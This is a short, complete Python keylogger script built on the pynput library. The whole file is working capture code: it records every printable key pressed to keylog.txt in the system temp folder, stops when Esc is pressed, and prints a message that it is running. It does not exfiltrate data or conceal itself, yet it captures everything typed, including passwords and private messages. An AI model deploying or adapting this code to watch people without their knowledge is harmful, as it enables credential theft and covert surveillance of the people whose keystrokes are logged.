from pynput.keyboard import Listener, Key
import os
import tempfile

# Get the path to the temp directory
temp_path = tempfile.gettempdir()
log_file = os.path.join(temp_path, "keylog.txt")  # Path to the keylog.txt file in the temp folder

# Define a function to log the keys
def on_press(key):
    try:
        # Only log normal characters (no special keys like Shift, Ctrl, etc.)
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        # Skip special keys like 'Shift', 'Ctrl', etc.
        pass

    # Check if the 'Esc' key is pressed and stop the listener
    if key == Key.esc:
        return False  # This will stop the listener and exit the script

# Function to start the listener and run indefinitely
def start_logging():
    with Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener running until manually stopped

if __name__ == "__main__":
    print(f"Keylogger is now running. Press 'Esc' to stop. All data will be saved to {log_file}")
    start_logging()
